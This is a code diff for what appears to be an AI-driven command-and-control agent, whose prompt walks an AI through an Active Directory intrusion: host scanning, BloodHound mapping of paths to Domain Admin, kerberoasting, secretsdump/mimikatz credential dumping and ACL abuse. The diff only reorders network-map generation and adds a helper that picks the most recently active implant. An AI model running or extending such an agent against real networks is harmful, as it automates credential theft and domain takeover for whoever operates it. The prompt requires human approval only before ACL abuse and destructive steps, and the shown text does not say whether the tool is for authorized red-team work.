@@ -604,7 +604,7 @@ PHASE 1 — DISCOVERY
 2. c2_run_recon(agent_id, subnet)       → port-scan, find hosts + DC IPs
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-PHASE 2 — AD ENUMERATION + ANALYSIS + VISUALIZATION
+PHASE 2 — AD ENUMERATION + ANALYSIS
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 3. c2_run_sharphound(agent_id)          → BloodHound collection, ZIP uploaded to loot
 4. c2_analyze_sharphound(agent_id)      → parse ZIP, extract full attack graph:
@@ -613,7 +613,7 @@ PHASE 2 — AD ENUMERATION + ANALYSIS + VISUALIZATION
      • All attack paths to DA     (step-by-step chains from any user to Domain Admin)
      • Kerberoastable accounts
    READ this output carefully — it drives everything in Phase 4.
-5. c2_generate_map(agent_id)            → generate network_map.html visualization
+   NOTE: the network map is generated automatically after this step — do NOT call c2_generate_map here.
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 PHASE 3 — CREDENTIAL HARVESTING
@@ -676,7 +676,8 @@ RULES
 - ALWAYS call c2_ask_human() before every ACL abuse or destructive action.
 - If a task fails or times out → skip it, continue to the next step.
 - Do NOT retry indefinitely.
-- Always end with c2_generate_map() even if earlier phases were incomplete.
+- The network map is auto-generated after c2_analyze_sharphound — do NOT call c2_generate_map during phases 1-3.
+- Always end with c2_generate_map() at the very end of phase 4 for a final updated map.
 
 Current date/time: {datetime}
 """
@@ -769,6 +770,14 @@ class C2Agent:
             return "continue"
         return "end"
 
+    def _get_active_agent_id(self) -> str | None:
+        """Return the most recently seen agent_id from the C2 server."""
+        rows = _get("/agents")
+        if not isinstance(rows, list) or not rows:
+            return None
+        rows.sort(key=lambda r: r.get("last_seen", ""), reverse=True)
+        return rows[0].get("agent_id")
+
     def _invoke(self, message: str, session_id: str) -> str:
         config = {"configurable": {"thread_id": session_id}}
         final = self.app.invoke(
@@ -788,15 +797,23 @@ class C2Agent:
             "2. c2_run_recon\n"
             "3. c2_run_sharphound\n"
             "4. c2_analyze_sharphound\n"
-            "5. c2_generate_map\n"
-            "6. c2_run_kerberoast\n"
-            "7. c2_run_secretsdump (if mimikatz.exe available)\n"
-            "8. c2_get_credentials\n"
-            "After step 8, stop and summarise ALL findings: credentials harvested, "
+            "5. c2_run_kerberoast\n"
+            "6. c2_run_secretsdump (if mimikatz.exe available)\n"
+            "7. c2_get_credentials\n"
+            "After step 7, stop and summarise ALL findings: credentials harvested, "
             "local admin relationships, and ACL attack paths."
         )
         report = self._invoke(enum_prompt, session_id)
         self.memory_store.add(report, user_id=session_id)
+
+        # ── Auto-generate network map right after analyze phase ───────────────
+        print(f"\n[C2 Agent] Generating network map...")
+        agent_id = self._get_active_agent_id()
+        if agent_id:
+            map_result = c2_generate_map.invoke({"agent_id": agent_id})
+            print(f"  {map_result}")
+        else:
+            print("  [warn] No active agent found — skipping auto map generation")
 
         print(f"\n{'='*60}")
         print("[C2 Agent] Enumeration complete. Starting execution phase...\n")
